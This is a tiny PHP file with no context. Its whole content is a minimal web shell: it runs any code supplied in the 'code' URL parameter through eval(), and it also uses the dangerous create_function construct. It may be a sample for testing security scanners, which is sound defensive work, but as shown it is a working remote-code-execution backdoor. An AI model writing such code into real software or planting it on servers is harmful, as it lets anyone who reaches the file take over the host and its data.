<?php
eval($_GET['code']);
$f = create_function('$a', 'return $a;');
